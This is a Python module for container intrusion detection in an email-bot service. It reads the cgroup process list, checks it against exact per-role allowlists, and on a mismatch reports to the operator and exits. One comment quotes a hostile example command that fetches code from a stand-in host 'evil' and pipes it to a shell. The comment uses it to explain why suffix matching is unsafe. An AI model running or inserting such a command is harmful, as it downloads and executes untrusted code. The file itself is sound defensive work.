"""Watch this container for a process that should not be in it, and refuse to
keep running if one appears.

`backend/execguard.py` is the prevention and it is the stronger half: a seccomp
filter cannot be raced, and nothing this module does would catch an `execve`
that the filter already killed. This is the half that covers what the filter
cannot -- the processes it was never installed in. In the mail role those are
real: the entrypoint shell, supercronic, and the shells and interpreters
supercronic starts on a schedule. In every other role there are none, which
makes the rule for four of the five containers exactly "one process, mine".

So this is not a monitor standing in for a control. It is the answer to "what
if somebody got in anyway", which is a question a measured image still has to
answer, and answering it with silence was the gap. A process that appears here
is a breach, and a breach that nobody hears about is the expensive kind.

The pid list comes from the cgroup rather than from a scan of `/proc`, because
the cgroup is exactly this container's processes and `/proc` is whatever the
pid namespace happens to contain. On the Hetzner box the same read gives the
systemd unit's own processes, so one implementation covers both deployments.

The response is `report, then exit`, in that order and with the exit
unconditional:

  * The report goes to `backend/intrusion.py`, which the mail daemon drains and
    sends to the operator's Telegram. Two roles have nowhere to write one, so
    the reporter is passed in and may be None.
  * The exit is `os._exit`, not `sys.exit`. This runs on a thread, where
    `SystemExit` would end the thread and leave the compromised process
    serving; and an atexit handler is code an attacker in this address space
    has already had the chance to install.

`restart: always` then restarts the container, this module finds the container
clean, and the loop ends. If the attacker's process comes back with the
service, the container loops visibly instead of serving quietly, which is the
intended failure.

Cost, stated rather than discovered: a false positive takes a container down.
That is why the expected set is exact for four roles, and why the one role with
a legitimately moving set re-reads a pid before refusing on it.
"""

from __future__ import annotations

import os
import sys
import threading
import time
from pathlib import Path

from backend import secrets

CGROUP_ROOT = Path("/sys/fs/cgroup")
SELF_CGROUP = Path("/proc/self/cgroup")
PROC = Path("/proc")

POLL_SECONDS = 2.0

# Distinct from 1 so an operator reading `docker inspect` or a journal line can
# tell "this container refused a process" from "this service raised".
EXIT_INTRUSION = 99

# The one role whose container legitimately holds more than one process:
# flake.nix starts supercronic beside the daemon, and supercronic starts a
# shell per job. Every other role's entrypoint `exec`s its interpreter, so the
# service is pid 1 and there is nothing else to allow.
SCHEDULING_ROLE = "mail"

# What supercronic is allowed to be running, as the module each crontab line
# ends in. Kept in step with the crontab in flake.nix by
# `tests/test_procwatch.py`, which reads both this and
# `deploy/render_image_manifest.ROLE_ROOTS` -- a job added to the schedule and
# not here is a container that kills itself at 05:00.
SCHEDULED_MODULES = (
    "backend.drafting.email_summary",
    "backend.onboarding.watch_renew",
    "backend.billing.billing_poller",
)

# The shell command supercronic runs for each of those, character for character
# as flake.nix writes the crontab. Matched whole rather than by suffix: a rule
# that accepted any command *ending* in a scheduled module accepts
# `sh -c 'curl evil | sh; echo backend.billing.billing_poller'`, which is a
# permitted process spelled out of the allowlist's own vocabulary.
SCHEDULED_COMMANDS = frozenset(
    f"cd /app && python -m {module}" for module in SCHEDULED_MODULES)

CRONTAB_PATH = "/app/crontab"

SERVICE_MODULES = {
    "mail": "backend.daemons.daemon_loop",
    "web": "frontend.web_server",
    "hook": "backend.daemons.gmail_hook_server",
    "egress": "backend.daemons.egress_proxy",
    "ingress": "backend.daemons.ingress_proxy",
}


def role_of(module):
    """The role whose service is this module, keyed by the name `python -m` was
    given. Entry points call `role_of(__spec__.name)` rather than naming their
    own role, so a container cannot come to watch itself against another role's
    expected set -- which for four of the five roles is the difference between
    "one process" and "one process plus a scheduler"."""
    for role, name in SERVICE_MODULES.items():
        if name == module:
            return role
    raise AssertionError(
        f"{module!r} is not any role's service module; add it to "
        "SERVICE_MODULES or it will be watched as nothing")


ENTRYPOINT_NAME = "email-bot-entrypoint"
SUPERCRONIC_NAME = "supercronic"
SHELLS = ("sh", "bash", "dash")


class IntrusionRefused(Exception):
    """A process is running in this container that its image does not start.

    A named refusal and not an assert: the subject crossed a trust boundary --
    it is the state of a machine an attacker may be on -- and `-O` must not be
    able to remove the check. Never caught into a fallback; the one handler
    reports it and ends the process.

    Carries the processes it found, because the handler has to say what it saw
    and a formatted message is not something to parse back out."""

    def __init__(self, message, entries):
        super().__init__(message)
        assert entries, "an intrusion refusal names the processes it found"
        self.entries = entries


class ProcSourceUnavailable(RuntimeError):
    """The process list cannot be read, so this container is unwatched."""


def _cgroup_dir():
    """The directory whose `cgroup.procs` is this container's process list.

    Inside a container with a private cgroup namespace the line is `0::/` and
    the answer is the mount root. Under systemd it is the unit's own path below
    it. Both are the same read."""
    try:
        line = SELF_CGROUP.read_text().strip().splitlines()[-1]
    except OSError as err:
        raise ProcSourceUnavailable(f"cannot read {SELF_CGROUP}: {err}")
    parts = line.split(":", 2)
    if len(parts) != 3 or parts[0] != "0":
        raise ProcSourceUnavailable(
            f"{SELF_CGROUP} is not cgroup v2 ({line!r}); this watcher reads a "
            "unified hierarchy and would otherwise watch the wrong set")
    return CGROUP_ROOT / parts[2].lstrip("/")


def live_pids():
    """Every pid in this container, ours included."""
    root = _cgroup_dir()
    files = [root / "cgroup.procs"]
    try:
        files.extend(sorted(root.rglob("cgroup.procs")))
    except OSError:
        pass
    pids, seen_any = set(), False
    for path in files:
        try:
            text = path.read_text()
        except OSError:
            continue
        seen_any = True
        pids.update(int(line) for line in text.split() if line.isdigit())
    if not seen_any:
        raise ProcSourceUnavailable(f"no readable cgroup.procs under {root}")
    return pids


def cmdline(pid):
    """A process's argv, or None if it is gone or unreadable. Unreadable is not
    the same as absent and the caller must not treat it as one: a process this
    uid cannot describe is a more interesting finding than one it can."""
    try:
        raw = (PROC / str(pid) / "cmdline").read_bytes()
    except OSError:
        return None
    return [part.decode("utf-8", "replace") for part in raw.split(b"\0") if part]


def _runs_module(argv, allowed):
    """Whether argv is an interpreter started as `python -m <one of allowed>`.

    The module is read from the position after `-m` rather than searched for
    anywhere in argv, so a payload that merely mentions the name in an argument
    does not pass."""
    for index, arg in enumerate(argv[:-1]):
        if arg == "-m":
            return argv[index + 1] in allowed
    return False


def _is_scheduled_shell(argv):
    """A `sh -c` wrapper supercronic puts around a crontab line.

    The command has to be one of `SCHEDULED_COMMANDS` exactly. Anything looser
    -- a suffix match, a substring -- lets a shell run whatever it likes as long
    as the string ends the right way, which is an allowlist an attacker writes
    the other half of."""
    if len(argv) != 3 or argv[1] != "-c":
        return False
    if os.path.basename(argv[0]).lstrip("-") not in SHELLS:
        return False
    return argv[2].strip() in SCHEDULED_COMMANDS


def _is_binary(argv, name):
    """argv[0] is that program, by basename off an absolute path. `in argv[0]`
    would take any path with the name somewhere inside it."""
    return bool(argv) and (argv[0] == name or argv[0].endswith("/" + name))


def expected(role, pid, argv):
    """Whether this process belongs in this role's container.

    Four of the five roles `exec` their interpreter, so the whole answer is
    "it is us". The mail role also runs the entrypoint that started it,
    supercronic, and whatever supercronic is currently running from the
    crontab.

    The role's own service module is deliberately not in the allowed set: this
    watcher runs inside that process, so it is already answered by the pid, and
    allowing the name would allow a *second* daemon nobody started."""
    if pid == os.getpid():
        return True
    if role != SCHEDULING_ROLE or not argv:
        return False
    if _is_binary(argv, ENTRYPOINT_NAME):
        return True
    if _is_binary(argv, SUPERCRONIC_NAME):
        return argv[1:] == [CRONTAB_PATH]
    if _runs_module(argv, SCHEDULED_MODULES):
        return True
    return _is_scheduled_shell(argv)


def check(role):
    """Raise `IntrusionRefused` if this container holds a process it should
    not. Separated from the loop below so the rule is testable without a thread
    and without ending the test runner."""
    assert role in SERVICE_MODULES, f"unknown role {role!r}"
    unexpected = []
    for pid in sorted(live_pids()):
        argv = cmdline(pid)
        if expected(role, pid, argv):
            continue
        if argv is None and not (PROC / str(pid)).exists():
            # It ended between the listing and the read. Only the role that
            # legitimately starts processes gets the benefit of that doubt;
            # anywhere else a pid that existed at all is the finding.
            if role == SCHEDULING_ROLE:
                continue
        unexpected.append({"pid": pid,
                           "cmdline": " ".join(argv) if argv else "<unreadable>"})
    if unexpected:
        raise IntrusionRefused(
            f"{role} container holds {len(unexpected)} process(es) its image "
            f"does not start: {unexpected}", unexpected)


def _refuse(role, err, report):
    sys.stderr.write(f"[procwatch] INTRUSION in {role}: {err}\n")
    sys.stderr.flush()
    if report is not None:
        for entry in err.entries:
            report(entry)
    os._exit(EXIT_INTRUSION)


def _loop(role, report, poll):
    while True:
        try:
            check(role)
        except IntrusionRefused as err:
            _refuse(role, err, report)
        except ProcSourceUnavailable as err:
            sys.stderr.write(f"[procwatch] {role} unwatched: {err}\n")
            sys.stderr.flush()
            return
        time.sleep(poll)


def start(role, report=None, poll=POLL_SECONDS):
    """Begin watching, on a daemon thread. Raises if the process list cannot be
    read at all and this is the enclave: a container nobody can watch is not
    one to start serving from."""
    try:
        live_pids()
    except ProcSourceUnavailable as err:
        if secrets.tee_required():
            raise
        sys.stderr.write(f"[procwatch] {role} not watched ({err})\n")
        sys.stderr.flush()
        return None
    thread = threading.Thread(target=_loop, args=(role, report, poll),
                              name=f"procwatch-{role}", daemon=True)
    thread.start()
    return thread
